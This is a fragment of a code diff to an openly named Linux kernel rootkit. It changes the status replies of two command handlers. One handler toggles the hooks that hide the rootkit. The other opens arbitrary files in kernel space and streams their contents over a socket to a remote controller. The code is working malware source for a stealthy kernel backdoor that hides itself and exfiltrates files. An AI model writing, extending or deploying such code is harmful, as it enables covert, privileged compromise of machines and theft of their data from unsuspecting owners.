@@ -140,15 +140,7 @@ static int do_hide(struct socket *sock, char *args)
 {
     USE_NETWORK(128)
 
-    status = toggle_hooks();
-    if (!status)
-    {
-        sprintf(buf, "hooks are off. rootkit is not sneaky anymore!\n");
-    }
-    else
-    {
-        sprintf(buf, "hooks are on. rootkit is invisible!\n");
-    }
+    sprintf(buf, "%d\n", toggle_hooks());
     vec.iov_base = buf;
     vec.iov_len = strlen(buf);
     if ((status = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
@@ -177,7 +169,7 @@ static int do_download(struct socket *sock, char *args)
     file = filp_open(args, O_RDONLY, 0);
     if (IS_ERR(file))
     {
-        sprintf(buf, "KO: couldn't open file");
+        sprintf(buf, "KO\n");
         vec.iov_base = buf;
         vec.iov_len = strlen(buf);
         if ((status = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
@@ -188,6 +180,18 @@ static int do_download(struct socket *sock, char *args)
         }
         pr_err("commands: download: couldn't open file %s", args);
         return 1;
+    }
+    else
+    {
+        sprintf(buf, "OK\n");
+        vec.iov_base = buf;
+        vec.iov_len = strlen(buf);
+        if ((status = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
+        {
+            pr_warn("commands: download: couldn't send status message: %d\n",
+                    status);
+            return -1;
+        }
     }
 
     while ((len = kernel_read(file, buf, 1024, &pos)) > 0)
